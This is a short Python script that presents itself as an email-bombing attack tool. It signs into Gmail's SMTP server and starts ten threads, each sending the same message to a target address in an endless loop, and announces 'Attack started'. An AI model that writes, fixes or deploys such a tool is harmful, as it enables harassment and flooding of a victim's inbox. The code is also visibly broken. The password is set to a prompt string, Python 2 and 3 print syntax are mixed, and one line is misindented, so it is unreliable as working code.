import sys, smtplib, threading, datetime

email = input("Your email: ")
user = email.split("@")[0]
passw = "Your password: "

help ="""Usage: python {} <TARGET_EMAIL> <MESSAGE>
""".format(sys.argv[0])
try:
    target = sys.argv[1]
    message = sys.argv[2]
except:
    print help
    quit()

def Spam(target, message):
    global sent
    try:
        sent = 0
        smtp = smtplib.SMTP_SSL("smtp.gmail.com", 465)
        smtp.login(user, passw)
        while 1:
            smtp.sendmail(email, target, message)
            sent += 1
            sys.stdout.write("\r{} Emails Sent!".format(sent))
                        sys.stdout.flush()
    except smtplib.SMTPAuthenticationError:
        print("Too much logins, wait 2 minutes and try again.")
        quit()
    except: pass
if __name__ == '__main__':
    rn = str(datetime.datetime.now())[:19]
    print("[+] Attack started at {}.\n".format(rn))
    for i in range(10):
        t = threading.Thread(target=Spam, args=(target, message))
        t.start()
